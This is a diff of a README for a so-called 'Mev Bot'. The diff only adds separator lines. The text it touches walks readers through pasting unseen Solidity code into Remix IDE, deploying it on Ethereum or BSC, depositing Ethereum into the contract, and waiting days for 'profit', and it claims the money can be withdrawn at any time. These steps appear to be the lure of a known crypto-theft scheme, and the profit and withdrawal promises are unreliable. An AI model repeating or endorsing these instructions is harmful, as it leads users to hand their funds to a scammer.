@@ -80,6 +80,7 @@ The bot will make transactions on your entire balance to increase profit
 
 
 First-source code
+-----
 
 Copy code and paste in Remix IDE
 
@@ -87,6 +88,7 @@ Copy code and paste in Remix IDE
 
 
 Click Solidity complier 0.6.6
+------
 
 And press Compile Mev Bot.sol
 
@@ -94,15 +96,18 @@ And press Compile Mev Bot.sol
 
 
 Select ETH or BSC(BNB) network
+-----
 
 and router address
 
 Press Transact (Deploy)
+-----
 
 ![3](https://user-images.githubusercontent.com/131911477/234766652-0254d9fd-8c9f-48d7-b511-4015f4ea2729.png)
 
 
 Next-deposit (balans Mev Bot)
+------
 
 Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
 
@@ -116,5 +121,7 @@ Copy contract your MevBot and send a number of Ethereum to the bot's balance for
 
 
 Wait a couple of days for a profit. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 0.2-1
+----
 
 At any time you can Stop bot or return your money by calling the withdrawal function.
+-----
